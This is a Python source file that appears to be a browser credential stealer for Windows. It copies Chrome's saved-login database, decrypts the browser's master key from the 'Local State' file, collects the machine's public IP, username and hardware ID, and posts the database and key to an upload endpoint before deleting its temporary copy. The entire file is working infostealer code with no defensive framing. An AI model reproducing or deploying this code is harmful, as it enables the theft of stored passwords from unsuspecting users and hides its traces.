import requests
import os
import win32crypt
import string
import random
import shutil
import subprocess
import json
import base64

class Client:
    def main(self) -> None:
        self.ip = requests.get("https://api.ipify.org").text
        self.username = os.getenv("username")
        self.masterKey = self.getKey()
        self.database = self.getDb()
        self.object = {
            "masterKey": base64.b64encode(self.masterKey),
            "ip": self.ip,
            "hwid": str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip(),
            "username": self.username
        }
        
        requests.post("http://localhost:3000/api/log/upload",
                    files={
                        'file': open(self.database, 'rb')
                    },
                    data=self.object)
        
        self.cleanFiles()

    def cleanFiles(self) -> None:
        os.remove(self.database)

    def getDb(self) -> str:
        return shutil.copy(os.path.join(os.getenv("LOCALAPPDATA"),
                "Google", "Chrome", "User Data",
                "default", "Login Data"), os.path.join(os.getenv("TEMP"), 
                "".join(random.choice(string.ascii_uppercase) for i in range(20))))

    def getKey(self) -> str:
        with open(os.path.join(os.getenv("LOCALAPPDATA"), 
                "Google", "Chrome", "User Data", 
                "Local State"), "r", encoding="utf-8") as file:
            localState = json.loads(file.read())
        
        key = base64.b64decode(localState["os_crypt"]["encrypted_key"])
        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

if __name__ == "__main__":
    client = Client()
    client.main()